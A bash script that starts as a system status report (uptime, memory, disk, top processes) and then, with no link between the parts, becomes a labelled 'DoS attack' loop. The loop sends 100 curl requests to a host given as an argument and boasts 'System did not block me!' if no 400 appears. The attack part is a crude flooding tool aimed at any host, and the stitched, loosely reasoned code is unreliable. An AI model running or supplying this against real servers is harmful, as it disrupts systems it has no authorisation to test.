#!/usr/bin/env bash


echo "System Status Report:"
echo "---------------------"

# Display current date and time
echo "Date and Time:"
date

# Display system uptime
echo -e "\nSystem Uptime:"
uptime

# Display system load average
echo -e "\nSystem Load Average:"
cat /proc/loadavg

# Display memory usage
echo -e "\nMemory Usage:"
free -h

# Display disk space usage
echo -e "\nDisk Space Usage:"
df -h

# Display top CPU-consuming processes
echo -e "\nTop CPU-consuming Processes:"
ps -eo pid,ppid,cmd,%cpu,%mem --sort=-%cpu | head -n 6

# Display top memory-consuming processes
echo -e "\nTop Memory-consuming Processes:"
ps -eo pid,ppid,cmd,%cpu,%mem --sort=-%mem | head -n 6



# get host to perform attack
HOST=$1

# message
echo "Starting DoS attack ...";

echo "performing at:";

# print date to set attack
date "+%Y/%m/%d %H:%M:%S";

echo "\n";

# make a loop to perform DoS attack
for _ in {1..100}
do
  TMP=$(curl -i -X GET "$HOST")
  echo Got: "$TMP"

  if [[ "$TMP" == *"400"* ]]; then
    echo "System is secure on DoS attack!"
    exit 1;
  fi

  sleep 1s;
done

echo "Sent 100 http requests!";

sleep 5s;

echo "System did not block me!";

exit 0;
